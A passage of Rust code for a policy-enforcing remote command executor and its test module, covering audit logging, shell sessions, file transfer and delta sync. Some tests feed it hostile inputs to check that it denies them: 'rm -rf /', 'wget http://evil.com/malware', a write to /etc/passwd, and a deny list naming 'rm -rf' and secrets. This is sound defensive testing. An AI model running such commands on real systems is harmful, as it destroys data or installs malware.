/// Window format: `"HH:MM-HH:MM"` (24-hour, e.g. `"02:00-04:00"`).
/// Windows that wrap midnight are supported (e.g. `"22:00-02:00"`).
/// An unparseable window string is treated as permissive (returns `true`).
fn is_within_update_window(window: &str) -> bool {
    use chrono::Timelike;
    let now = chrono::Local::now();
    let now_mins = now.hour() * 60 + now.minute();

    let parts: Vec<&str> = window.splitn(2, '-').collect();
    if parts.len() != 2 {
        return true; // Unparseable — allow.
    }

    let parse_hhmm = |s: &str| -> Option<u32> {
        let p: Vec<&str> = s.trim().splitn(2, ':').collect();
        if p.len() != 2 {
            return None;
        }
        let h: u32 = p[0].parse().ok()?;
        let m: u32 = p[1].parse().ok()?;
        if h > 23 || m > 59 {
            return None;
        }
        Some(h * 60 + m)
    };

    let start_mins = match parse_hhmm(parts[0]) {
        Some(t) => t,
        None => return true, // Invalid format — allow.
    };
    let end_mins = match parse_hhmm(parts[1]) {
        Some(t) => t,
        None => return true, // Invalid format — allow.
    };

    if start_mins <= end_mins {
        now_mins >= start_mins && now_mins < end_mins
    } else {
        // Window wraps midnight (e.g. 22:00–02:00).
        now_mins >= start_mins || now_mins < end_mins
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use rf_audit::logger::AuditLogger;
    use rf_audit::types::AuditEntry;
    use std::sync::Mutex;

    /// In-memory audit logger for testing.
    struct TestAuditLogger {
        entries: Mutex<Vec<AuditEntry>>,
    }

    impl TestAuditLogger {
        fn new() -> Self {
            Self {
                entries: Mutex::new(Vec::new()),
            }
        }

        fn entries(&self) -> Vec<AuditEntry> {
            self.entries.lock().unwrap().clone()
        }
    }

    impl AuditLogger for TestAuditLogger {
        fn log(&self, entry: AuditEntry) -> Result<(), rf_audit::logger::AuditError> {
            self.entries.lock().unwrap().push(entry);
            Ok(())
        }
    }

    fn test_policy() -> RpcPolicy {
        let yaml = r#"
spec:
  commands:
    allow:
      - pattern: "^echo .*"
      - pattern: "^cat /tmp/.*"
      - pattern: "^true$"
      - pattern: "^false$"
      - pattern: "^sleep .*"
    deny:
      - pattern: ".*rm.*-rf.*"
      - pattern: ".*secret.*"
  resources:
    maxOutputBytes: 1024
    timeoutSeconds: 2
"#;
        RpcPolicy::from_yaml(yaml).unwrap()
    }

    fn make_executor(audit: Arc<dyn AuditLogger>) -> Executor {
        let policy = Arc::new(RwLock::new(test_policy()));
        Executor::new(policy, audit, "test-caller-key".into())
    }

    #[tokio::test]
    async fn test_execute_allowed_command() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-1".into(),
            action: Action::Execute {
                command: "echo hello world".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        assert_eq!(resp.id, "req-1");

        if let RpcResult::Success {
            stdout, exit_code, ..
        } = &resp.result
        {
            assert_eq!(stdout.trim(), "hello world");
            assert_eq!(*exit_code, 0);
        } else {
            panic!("expected success, got {:?}", resp.result);
        }

        // Verify audit entry
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].decision, "allowed");
        assert_eq!(entries[0].action, "execute");
        assert_eq!(entries[0].command.as_deref(), Some("echo hello world"));
        assert_eq!(entries[0].request_id, "req-1");
        assert_eq!(entries[0].caller_key, "test-caller-key");
        assert!(!entries[0].matched_rule.is_empty());
    }

    #[tokio::test]
    async fn test_execute_denied_command() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-2".into(),
            action: Action::Execute {
                command: "rm -rf /".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        assert_eq!(resp.id, "req-2");

        if let RpcResult::Denied { reason, rule } = &resp.result {
            assert!(
                reason.contains("deny rule") || reason.contains("immutable deny"),
                "unexpected reason: {reason}"
            );
            assert!(
                rule.contains("rm.*-rf") || rule.contains("immutable_deny"),
                "unexpected rule: {rule}"
            );
        } else {
            panic!("expected denied, got {:?}", resp.result);
        }

        // Verify audit entry records denial
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].decision, "denied");
        assert_eq!(entries[0].action, "execute");
        assert_eq!(entries[0].command.as_deref(), Some("rm -rf /"));
        assert_eq!(entries[0].request_id, "req-2");
        assert_eq!(entries[0].caller_key, "test-caller-key");
    }

    #[tokio::test]
    async fn test_execute_default_deny() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-3".into(),
            action: Action::Execute {
                command: "wget http://evil.com/malware".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Denied { reason, .. } = &resp.result {
            assert!(reason.contains("deny-by-default"));
        } else {
            panic!("expected denied, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_nonzero_exit_code() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-4".into(),
            action: Action::Execute {
                command: "false".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { exit_code, .. } = &resp.result {
            assert_ne!(*exit_code, 0);
        } else {
            panic!("expected success with non-zero exit, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_timeout() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-5".into(),
            action: Action::Execute {
                command: "sleep 10".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Error { message } = &resp.result {
            assert!(message.contains("timeout"));
        } else {
            panic!("expected timeout error, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_output_limiting() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Generate output larger than maxOutputBytes (1024)
        let req = Request {
            id: "req-6".into(),
            action: Action::Execute {
                command: "echo $(head -c 2048 /dev/zero | tr '\\0' 'A')".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert!(stdout.len() <= 1024);
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_execute_with_env() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let mut env = std::collections::HashMap::new();
        env.insert("MY_VAR".into(), "test_value".into());

        let req = Request {
            id: "req-7".into(),
            action: Action::Execute {
                command: "echo $MY_VAR".into(),
                env,
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert_eq!(stdout.trim(), "test_value");
        } else {
            panic!("expected success, got {:?}", resp.result);
        }
    }

    #[tokio::test]
    async fn test_metrics_action() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-8".into(),
            action: Action::Metrics,
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        if let RpcResult::Success { stdout, .. } = &resp.result {
            assert!(stdout.contains("cpus"));
            assert!(stdout.contains("memory_total_mb"));
        } else {
            panic!("expected success, got {:?}", resp.result);
        }

        // Verify audit entry for metrics
        let entries = audit.entries();
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].action, "metrics");
        assert_eq!(entries[0].decision, "allowed");
        assert_eq!(entries[0].request_id, "req-8");
    }

    #[tokio::test]
    async fn test_read_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-9".into(),
            action: Action::Read {
                path: "/etc/hostname".into(),
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { reason, .. } => {
                assert!(reason.contains("deny") || reason.contains("not allowed"));
            }
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_write_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-10".into(),
            action: Action::Write {
                path: "/etc/passwd".into(),
                data: b"evil".to_vec(),
                mode: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { .. } => {}
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_list_denied_by_policy() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-11".into(),
            action: Action::List {
                path: "/root".into(),
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Denied { .. } => {}
            _ => panic!("expected denied, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_read_allowed_with_policy() {
        // Canonicalize temp dir (on macOS, /tmp → /private/tmp, env::temp_dir may not be canonical)
        let tmp_base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let tmp_base_str = tmp_base.to_string_lossy();
        let yaml = format!(
            "spec:\n  commands:\n    allow:\n      - pattern: \".*\"\n  filesystem:\n    allow:\n      - path: \"{tmp_base_str}\"\n  resources:\n    maxOutputBytes: 1024\n    timeoutSeconds: 2\n"
        );
        let policy = RpcPolicy::from_yaml(&yaml).unwrap();
        let audit = Arc::new(TestAuditLogger::new());
        let exec = Executor::new(
            Arc::new(RwLock::new(policy)),
            audit.clone(),
            "test-key".into(),
        );

        // Create a temp file
        let tmp_file = tmp_base.join("rf_test_read.txt");
        tokio::fs::write(&tmp_file, b"hello world").await.unwrap();

        let req = Request {
            id: "req-12".into(),
            action: Action::Read {
                path: tmp_file.to_string_lossy().into(),
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                use base64::Engine;
                let decoded = base64::engine::general_purpose::STANDARD
                    .decode(stdout)
                    .unwrap();
                assert_eq!(decoded, b"hello world");
            }
            _ => panic!("expected success, got {:?}", resp.result),
        }

        let _ = tokio::fs::remove_file(&tmp_file).await;
    }

    #[tokio::test]
    async fn test_write_and_list_allowed() {
        // Canonicalize temp dir (on macOS, /tmp → /private/tmp)
        let tmp_base = std::fs::canonicalize(std::env::temp_dir()).unwrap();
        let tmp_base_str = tmp_base.to_string_lossy();
        let yaml = format!(
            "spec:\n  commands:\n    allow:\n      - pattern: \".*\"\n  filesystem:\n    allow:\n      - path: \"{tmp_base_str}\"\n  resources:\n    maxOutputBytes: 1024\n    timeoutSeconds: 2\n"
        );
        let policy = RpcPolicy::from_yaml(&yaml).unwrap();
        let audit = Arc::new(TestAuditLogger::new());
        let exec = Executor::new(
            Arc::new(RwLock::new(policy)),
            audit.clone(),
            "test-key".into(),
        );

        let test_dir = tmp_base.join("rf_test_dir");
        let _ = tokio::fs::create_dir(&test_dir).await;

        // Write a file
        let test_file = test_dir.join("test.txt");
        let req = Request {
            id: "req-13".into(),
            action: Action::Write {
                path: test_file.to_string_lossy().into(),
                data: b"file content".to_vec(),
                mode: Some(0o644),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                assert!(stdout.contains("wrote 12 bytes"));
            }
            _ => panic!("expected success for write, got {:?}", resp.result),
        }

        // List directory
        let req = Request {
            id: "req-14".into(),
            action: Action::List {
                path: test_dir.to_string_lossy().into(),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Success { stdout, .. } => {
                assert!(stdout.contains("test.txt"));
            }
            _ => panic!("expected success for list, got {:?}", resp.result),
        }

        // Cleanup
        let _ = tokio::fs::remove_dir_all(&test_dir).await;
    }

    #[tokio::test]
    async fn test_background_exec_and_wait() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Start background job
        let req = Request {
            id: "req-bg-1".into(),
            action: Action::BackgroundExec {
                command: "echo background-output".into(),
                env: HashMap::new(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        let job_id = match &resp.result {
            RpcResult::JobStarted { job_id, pid: _ } => job_id.clone(),
            _ => panic!("expected JobStarted, got {:?}", resp.result),
        };

        // Wait for job
        let req = Request {
            id: "req-bg-2".into(),
            action: Action::JobWait {
                job_id: job_id.clone(),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::JobStatus {
                running,
                exit_code,
                stdout,
                ..
            } => {
                assert!(!running);
                assert_eq!(*exit_code, Some(0));
                assert!(stdout.as_ref().unwrap().contains("background-output"));
            }
            _ => panic!("expected JobStatus, got {:?}", resp.result),
        }
    }

    #[tokio::test]
    async fn test_background_exec_query_unknown() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        let req = Request {
            id: "req-bg-3".into(),
            action: Action::JobQuery {
                job_id: "nonexistent".into(),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::Error { message } => {
                assert!(message.contains("unknown job"));
            }
            _ => panic!("expected error, got {:?}", resp.result),
        }
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn test_shell_session_recording() {
        // Policy that allows shell commands
        let yaml = r#"
spec:
  commands:
    allow:
      - pattern: ".*"
  resources:
    maxOutputBytes: 1024
    timeoutSeconds: 2
"#;
        let policy = RpcPolicy::from_yaml(yaml).unwrap();
        let audit = Arc::new(TestAuditLogger::new());
        let exec = Executor::new(
            Arc::new(RwLock::new(policy)),
            audit.clone(),
            "test-key".into(),
        );

        // Open shell
        let req = Request {
            id: "shell-1".into(),
            action: Action::Shell {
                shell: Some("/bin/sh".into()),
                rows: 24,
                cols: 80,
                env: HashMap::new(),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        let session_id = match &resp.result {
            RpcResult::ShellOpened { session_id } => session_id.clone(),
            _ => panic!("expected ShellOpened, got {:?}", resp.result),
        };

        // Verify shell_open audit
        {
            let entries = audit.entries();
            assert_eq!(entries.len(), 1);
            assert_eq!(entries[0].action, "shell_open");
            assert_eq!(entries[0].decision, "allowed");
            assert_eq!(entries[0].request_id, "shell-1");
        }

        // Send input
        let req = Request {
            id: "shell-2".into(),
            action: Action::ShellInput {
                session_id: session_id.clone(),
                data: b"echo hello\n".to_vec(),
            },
            timeout_ms: None,
            reason: None,
        };
        let _resp = exec.handle(req).await;

        // Verify shell_input audit
        {
            let entries = audit.entries();
            assert!(entries.len() >= 2);
            let input_entry = entries.iter().find(|e| e.action == "shell_input").unwrap();
            assert_eq!(input_entry.decision, "allowed");
            assert_eq!(input_entry.request_id, "shell-2");
            assert_eq!(input_entry.command.as_deref(), Some(&*session_id));
        }

        // Close shell — should emit recording
        let req = Request {
            id: "shell-3".into(),
            action: Action::ShellClose {
                session_id: session_id.clone(),
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match &resp.result {
            RpcResult::ShellExited { exit_code, .. } => {
                assert_eq!(*exit_code, 0);
            }
            _ => panic!("expected ShellExited, got {:?}", resp.result),
        }

        // Verify recording audit entry
        let entries = audit.entries();
        let recording = entries
            .iter()
            .find(|e| e.action == "shell_recording")
            .expect("expected shell_recording audit entry");
        assert_eq!(recording.decision, "recorded");
        assert_eq!(recording.request_id, "shell-3");
        // Recording should contain asciicast v2 header
        let asciicast = recording
            .reason
            .as_ref()
            .expect("recording should be in reason field");
        assert!(
            asciicast.contains("\"version\":2"),
            "asciicast missing header"
        );
        assert!(
            asciicast.contains("\"width\":80"),
            "asciicast missing width"
        );
        // Should have captured at least the input event
        assert!(
            recording.matched_rule.contains("events"),
            "should report event count"
        );

        // Verify shell_close audit entry
        let close_entry = entries
            .iter()
            .find(|e| e.action == "shell_close")
            .expect("expected shell_close audit entry");
        assert_eq!(close_entry.decision, "allowed");
        assert_eq!(close_entry.request_id, "shell-3");
    }

    /// Verify that audit entries are valid JSON (structured JSON-lines format).
    #[tokio::test]
    async fn test_audit_entries_are_valid_json() {
        let audit = Arc::new(TestAuditLogger::new());
        let exec = make_executor(audit.clone());

        // Execute an allowed command
        let req = Request {
            id: "json-1".into(),
            action: Action::Execute {
                command: "echo json-test".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };
        exec.handle(req).await;

        // Execute a denied command
        let req = Request {
            id: "json-2".into(),
            action: Action::Execute {
                command: "rm -rf /tmp/evil".into(),
                env: Default::default(),
                workdir: None,
            },
            timeout_ms: None,
            reason: None,
        };
        exec.handle(req).await;

        // Both entries must serialize to valid JSON
        let entries = audit.entries();
        assert_eq!(entries.len(), 2);
        for entry in &entries {
            let json = serde_json::to_string(entry).expect("audit entry must be JSON-serializable");
            // Parse back to verify round-trip
            let parsed: serde_json::Value =
                serde_json::from_str(&json).expect("audit JSON must be valid");
            assert!(parsed.get("timestamp").is_some());
            assert!(parsed.get("request_id").is_some());
            assert!(parsed.get("action").is_some());
            assert!(parsed.get("decision").is_some());
            assert!(parsed.get("matched_rule").is_some());
            assert!(parsed.get("caller_key").is_some());
            assert!(parsed.get("duration_ms").is_some());
        }

        // Verify allowed vs denied
        assert_eq!(entries[0].decision, "allowed");
        assert_eq!(entries[1].decision, "denied");
    }

    fn small_file_size_policy() -> RpcPolicy {
        let yaml = r#"
spec:
  commands:
    allow:
      - pattern: ".*"
  filesystem:
    allow:
      - path: /tmp
  resources:
    maxOutputBytes: 1048576
    timeoutSeconds: 30
    maxFileSizeBytes: 10
"#;
        RpcPolicy::from_yaml(yaml).unwrap()
    }

    #[tokio::test]
    async fn test_file_push_size_limit_denied() {
        let audit = Arc::new(TestAuditLogger::new());
        let policy = Arc::new(RwLock::new(small_file_size_policy()));
        let exec = Executor::new(policy, audit, "test-caller".into());

        // 11 bytes — exceeds the 10-byte limit
        let req = Request {
            id: "push-size-1".into(),
            action: Action::FilePush {
                path: "/tmp/rf_test_size.txt".into(),
                offset: 0,
                data: vec![0u8; 11],
                done: true,
                checksum: None,
                mode: None,
                compress: false,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        assert!(
            matches!(resp.result, RpcResult::Denied { .. }),
            "expected Denied, got {:?}",
            resp.result
        );
    }

    #[tokio::test]
    async fn test_file_push_size_limit_allowed() {
        let audit = Arc::new(TestAuditLogger::new());
        let policy = Arc::new(RwLock::new(small_file_size_policy()));
        let exec = Executor::new(policy, audit, "test-caller".into());

        // 5 bytes — within the 10-byte limit
        let req = Request {
            id: "push-size-2".into(),
            action: Action::FilePush {
                path: "/tmp/rf_test_size_ok.txt".into(),
                offset: 0,
                data: b"hello".to_vec(),
                done: true,
                checksum: None,
                mode: None,
                compress: false,
            },
            timeout_ms: None,
            reason: None,
        };

        let resp = exec.handle(req).await;
        assert!(
            matches!(
                resp.result,
                RpcResult::FileChunkAck {
                    finalized: true,
                    ..
                }
            ),
            "expected FileChunkAck(finalized), got {:?}",
            resp.result
        );
        // Cleanup
        let _ = tokio::fs::remove_file("/tmp/rf_test_size_ok.txt").await;
    }

    #[tokio::test]
    async fn test_http_rate_limit_blocked() {
        // With maxHttpRequestsPerWindow=1, the second request to the same target must be denied
        let audit = Arc::new(TestAuditLogger::new());
        let policy = RpcPolicy::from_yaml(
            r#"
spec:
  http:
    allow:
      - path: ".*"
  network:
    allow:
      - cidr: "127.0.0.0/8"
        ports: ["19876"]
  resources:
    maxHttpRequestsPerWindow: 1
    httpRateLimitWindowSecs: 60
"#,
        )
        .unwrap();
        let policy = Arc::new(RwLock::new(policy));
        let exec = Executor::new(policy, audit.clone(), "test-key".into());

        let make_req = |id: &str| Request {
            id: id.to_string(),
            action: Action::HttpForward {
                target: "127.0.0.1:19876".into(),
                method: "GET".into(),
                path: "/test".into(),
                headers: HashMap::new(),
                body: vec![],
            },
            timeout_ms: None,
            reason: None,
        };

        // First request — passes rate limit (counter incremented), may fail at TCP
        let resp1 = exec.handle(make_req("req-rl-1")).await;
        assert!(
            !matches!(&resp1.result, RpcResult::Denied { rule, .. } if rule == "resources.maxHttpRequestsPerWindow"),
            "first request should not be rate-limited, got {:?}",
            resp1.result
        );

        // Second request to same target — must be blocked by rate limit
        let resp2 = exec.handle(make_req("req-rl-2")).await;
        assert!(
            matches!(&resp2.result, RpcResult::Denied { rule, .. } if rule == "resources.maxHttpRequestsPerWindow"),
            "second request should be rate-limited, got {:?}",
            resp2.result
        );
    }

    #[tokio::test]
    async fn test_http_rate_limit_unlimited() {
        // maxHttpRequestsPerWindow=0 (default) disables rate limiting
        let audit = Arc::new(TestAuditLogger::new());
        let policy = RpcPolicy::from_yaml(
            r#"
spec:
  http:
    allow:
      - path: ".*"
  network:
    allow:
      - cidr: "127.0.0.0/8"
        ports: ["19877"]
"#,
        )
        .unwrap();
        let policy = Arc::new(RwLock::new(policy));
        let exec = Executor::new(policy, audit.clone(), "test-key".into());

        let make_req = |id: &str| Request {
            id: id.to_string(),
            action: Action::HttpForward {
                target: "127.0.0.1:19877".into(),
                method: "GET".into(),
                path: "/test".into(),
                headers: HashMap::new(),
                body: vec![],
            },
            timeout_ms: None,
            reason: None,
        };

        // Multiple requests must all pass the rate limit check (may fail at TCP — that's fine)
        for id in ["req-unl-1", "req-unl-2", "req-unl-3"] {
            let resp = exec.handle(make_req(id)).await;
            assert!(
                !matches!(&resp.result, RpcResult::Denied { rule, .. } if rule == "resources.maxHttpRequestsPerWindow"),
                "request {id} should not be rate-limited, got {:?}",
                resp.result
            );
        }
    }

    #[test]
    fn test_bandwidth_throttle_policy_defaults() {
        let policy = RpcPolicy::from_yaml(
            r#"
spec:
  commands:
    allow:
      - pattern: ".*"
"#,
        )
        .unwrap();
        // Default: unlimited (0)
        assert_eq!(policy.max_transfer_bytes_per_sec, 0);
    }

    #[test]
    fn test_bandwidth_throttle_policy_custom() {
        let policy = RpcPolicy::from_yaml(
            r#"
spec:
  commands:
    allow:
      - pattern: ".*"
  resources:
    maxTransferBytesPerSec: 524288
"#,
        )
        .unwrap();
        assert_eq!(policy.max_transfer_bytes_per_sec, 524_288);
    }

    #[tokio::test]
    async fn test_file_push_compress() {
        let dir = tempfile::tempdir().unwrap();
        // Get canonical parent so policy works on macOS (/var/folders -> /private/var/folders)
        let canonical_parent = dir.path().canonicalize().unwrap();
        let canonical_parent_str = canonical_parent.to_str().unwrap().to_string();
        // Use canonical path for the file so canonicalize() in check_path matches the policy
        let path = canonical_parent.join("rf_test_compress_push.txt");

        let audit = Arc::new(TestAuditLogger::new());
        let policy_yaml = format!(
            "spec:\n  filesystem:\n    allow:\n      - path: {canonical_parent_str}\n  resources:\n    maxFileSizeBytes: 1048576\n    timeoutSeconds: 30\n"
        );
        let policy = Arc::new(RwLock::new(RpcPolicy::from_yaml(&policy_yaml).unwrap()));
        let exec = Executor::new(policy, audit, "test-caller".into());

        let content = b"compressed transfer test data";
        let compressed = zstd::encode_all(content.as_slice(), 3).unwrap();

        let req = Request {
            id: "compress-push-1".into(),
            action: Action::FilePush {
                path: path.to_str().unwrap().to_string(),
                offset: 0,
                data: compressed,
                done: true,
                checksum: None,
                mode: None,
                compress: true,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        assert!(
            matches!(
                resp.result,
                RpcResult::FileChunkAck {
                    finalized: true,
                    ..
                }
            ),
            "expected finalized ack, got {:?}",
            resp.result
        );

        let written = tokio::fs::read(&path).await.unwrap();
        assert_eq!(written, content);
    }

    #[tokio::test]
    async fn test_file_pull_compress() {
        let content = b"file pull compression test data 12345";
        // Use tempdir with canonical path so policy works on macOS (/var/folders -> /private/var/folders)
        let dir = tempfile::tempdir().unwrap();
        let canonical_dir = dir.path().canonicalize().unwrap();
        let canonical_dir_str = canonical_dir.to_str().unwrap().to_string();
        let path = canonical_dir.join("rf_test_compress_pull.txt");
        tokio::fs::write(&path, content).await.unwrap();

        let audit = Arc::new(TestAuditLogger::new());
        let policy_yaml = format!(
            "spec:\n  filesystem:\n    allow:\n      - path: {canonical_dir_str}\n  resources:\n    maxFileSizeBytes: 1048576\n    timeoutSeconds: 30\n"
        );
        let policy = Arc::new(RwLock::new(RpcPolicy::from_yaml(&policy_yaml).unwrap()));
        let exec = Executor::new(policy, audit, "test-caller".into());

        let req = Request {
            id: "compress-pull-1".into(),
            action: Action::FilePull {
                path: path.to_str().unwrap().to_string(),
                offset: 0,
                max_chunk: 65536,
                compress: true,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match resp.result {
            RpcResult::FileChunk {
                data, compressed, ..
            } => {
                assert!(compressed, "expected compressed=true");
                let decompressed = zstd::decode_all(data.as_slice()).unwrap();
                assert_eq!(decompressed.as_slice(), content);
            }
            other => panic!("expected FileChunk, got {other:?}"),
        }
    }

    // ---- Delta sync tests -------------------------------------------------------

    /// Helper: make a minimal executor allowing access to a given directory.
    fn make_delta_executor(allow_dir: &str) -> Executor {
        let audit = Arc::new(TestAuditLogger::new());
        let yaml = format!(
            "spec:\n  filesystem:\n    allow:\n      - path: {allow_dir}\n  resources:\n    maxFileSizeBytes: 10485760\n    timeoutSeconds: 30\n"
        );
        let policy = Arc::new(RwLock::new(RpcPolicy::from_yaml(&yaml).unwrap()));
        Executor::new(policy, audit, "delta-test".into())
    }

    #[tokio::test]
    async fn test_file_delta_query_missing_file() {
        let dir = tempfile::tempdir().unwrap();
        let canonical = dir.path().canonicalize().unwrap();
        let exec = make_delta_executor(canonical.to_str().unwrap());
        let missing = canonical.join("no_such_file.bin");

        let req = Request {
            id: "dq-miss".into(),
            action: Action::FileDeltaQuery {
                path: missing.to_str().unwrap().into(),
                block_size: 4096,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match resp.result {
            RpcResult::FileDeltaIndex {
                file_missing,
                blocks,
                total_size,
            } => {
                assert!(file_missing, "expected file_missing=true");
                assert!(blocks.is_empty());
                assert_eq!(total_size, 0);
            }
            other => panic!("expected FileDeltaIndex, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn test_file_delta_query_existing_file() {
        let dir = tempfile::tempdir().unwrap();
        let canonical = dir.path().canonicalize().unwrap();
        let path = canonical.join("delta_query_test.bin");
        // Write 3 blocks of 1 KB each
        let block_size: usize = 1024;
        let data: Vec<u8> = (0u8..=255).cycle().take(block_size * 3).collect();
        tokio::fs::write(&path, &data).await.unwrap();

        let exec = make_delta_executor(canonical.to_str().unwrap());

        let req = Request {
            id: "dq-1".into(),
            action: Action::FileDeltaQuery {
                path: path.to_str().unwrap().into(),
                block_size: block_size as u32,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match resp.result {
            RpcResult::FileDeltaIndex {
                blocks,
                total_size,
                file_missing,
            } => {
                assert!(!file_missing);
                assert_eq!(total_size, (block_size * 3) as u64);
                assert_eq!(blocks.len(), 3);
                assert_eq!(blocks[0].offset, 0);
                assert_eq!(blocks[1].offset, block_size as u64);
                assert_eq!(blocks[2].offset, (block_size * 2) as u64);
                // Each block's SHA-256 must be non-empty and 64 hex chars
                for b in &blocks {
                    assert_eq!(b.sha256_hex.len(), 64);
                    assert!(b.adler32 != 0 || b.sha256_hex != "0".repeat(64));
                }
            }
            other => panic!("expected FileDeltaIndex, got {other:?}"),
        }
    }

    #[tokio::test]
    async fn test_file_delta_patch_new_file() {
        // No existing file — all blocks are patches
        let dir = tempfile::tempdir().unwrap();
        let canonical = dir.path().canonicalize().unwrap();
        let path = canonical.join("delta_patch_new.bin");
        let content: Vec<u8> = (0u8..128).collect();

        use sha2::{Digest, Sha256};
        let checksum: String = Sha256::digest(&content)
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect();

        let exec = make_delta_executor(canonical.to_str().unwrap());

        let req = Request {
            id: "dp-new".into(),
            action: Action::FileDeltaPatch {
                path: path.to_str().unwrap().into(),
                block_size: 64,
                patches: vec![
                    rf_rpc::types::DeltaPatch {
                        offset: 0,
                        data: content[..64].to_vec(),
                    },
                    rf_rpc::types::DeltaPatch {
                        offset: 64,
                        data: content[64..].to_vec(),
                    },
                ],
                total_size: content.len() as u64,
                checksum: Some(checksum),
                mode: None,
            },
            timeout_ms: None,
            reason: None,
        };
        let resp = exec.handle(req).await;
        match resp.result {
            RpcResult::FileDeltaApplied {
                blocks_changed,
                total_blocks,
                checksum_verified,
                bytes_transferred,
            } => {
                assert_eq!(blocks_changed, 2);
                assert_eq!(total_blocks, 2);
                assert!(checksum_verified);
                assert_eq!(bytes_transferred, content.len() as u64);
            }
            other => panic!("expected FileDeltaApplied, got {other:?}"),
        }
        let written = tokio::fs::read(&path).await.unwrap();
        assert_eq!(written, content);
    }

    #[tokio::test]
    async fn test_file_delta_patch_partial_change() {
        let dir = tempfile::tempdir().unwrap();
        let canonical = dir.path().canonicalize().unwrap();
        let path = canonical.join("delta_patch_partial.bin");
        let block_size: usize = 64;

        // Original: 4 blocks of 64 bytes
        let original: Vec<u8> = (0u8..=255).take(block_size * 4).collect();
        tokio::fs::write(&path, &original).await.unwrap();

        // New version: only block 1 (offset 64) changed
        let mut updated = original.clone();
        for byte in &mut updated[block_size..block_size * 2] {
            *byte = byte.wrapping_add(1);
        }

        use sha2::{Digest, Sha256};
        let checksum: String = Sha256::digest(&updated)
            .iter()
            .map(|b| format!("{b:02x}"))
